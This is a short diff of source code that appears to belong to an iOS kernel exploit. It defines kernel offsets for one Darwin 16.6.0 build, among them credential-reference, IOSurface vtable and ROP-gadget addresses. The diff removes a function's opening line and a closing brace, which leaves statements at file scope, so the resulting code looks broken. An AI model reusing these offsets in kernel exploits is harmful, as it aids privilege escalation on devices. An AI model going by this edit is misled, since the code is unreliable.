@@ -34,8 +34,6 @@
 
 #define LOG(str, args...) do { NSLog(@str "\n", ##args); } while(0)
 
-void offsets()
-{
 struct utsname u = { 0 };
 uname(&u);
 
@@ -68,7 +66,6 @@ if (strcmp(u.version, "Darwin Kernel Version 16.6.0: Mon Apr 17 17:33:34 PDT 201
 #define OFFSET_KAUTH_CRED_REF                   0xfffffff007367cf4
 #define OFFSET_IOSURFACEROOTUSERCLIENT_VTAB     0xfffffff006e7c9f8
 #define OFFSET_ROP_ADD_X0_X0_8                  0xfffffff000000000
-}
 }
 
 const uint64_t IOSURFACE_CREATE_SURFACE =  0;
